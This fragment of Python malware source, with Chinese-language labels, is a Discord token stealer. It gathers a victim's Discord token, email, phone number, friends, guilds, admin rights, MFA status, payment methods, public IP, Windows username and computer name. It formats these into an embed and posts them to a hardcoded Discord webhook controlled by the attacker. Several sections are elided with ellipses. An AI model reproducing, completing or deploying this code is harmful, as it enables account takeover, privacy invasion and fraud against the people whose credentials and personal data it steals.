            ...
            try:
                ...
                for id in res:
                    ...
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        print_boost += f"ㅤ- 現在可用\n"
                        available += 1
                    else:
                        print_boost += f"ㅤ- 可於 {cooldown.strftime('%d/%m/%Y at %H:%M:%S')} 提供\n"
                    boost = True
                if boost:
                    badges += f":BadgeBoost: "
                ...
                embed_user = {
                    'embeds': [
                        {
                            'title': f"**新用戶資料: {res_json['username']}**",
                            'description': f"""
                                ```yaml\n用戶 ID: {res_json['id']}\n電子郵件: {res_json['email']}\n電話號碼: {res_json['phone']}\n\n朋友: {friends}\n公會: {guilds}\n管理員權限: {guild_infos}\n``` ```yaml\n啟用 MFA: {res_json['mfa_enabled']}\n標誌: {flags}\n語言: {res_json['locale']}\n已驗證: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\n用戶名: {os.getenv("UserName")}\n電腦名稱: {os.getenv("COMPUTERNAME")}\n令牌位置: {platform}\n```令牌: \n```yaml\n{token}```""",
                            'color': 3092790,
                            'footer': {
                                'text': "bad"
                            },
                ...
                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1354400537524703242/4rhxWVv92kOVCE7mzolXR8RFrOROI5twrVCnpevfyJIlHRerw7P8zWcRa8c9z9g2cv4z', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
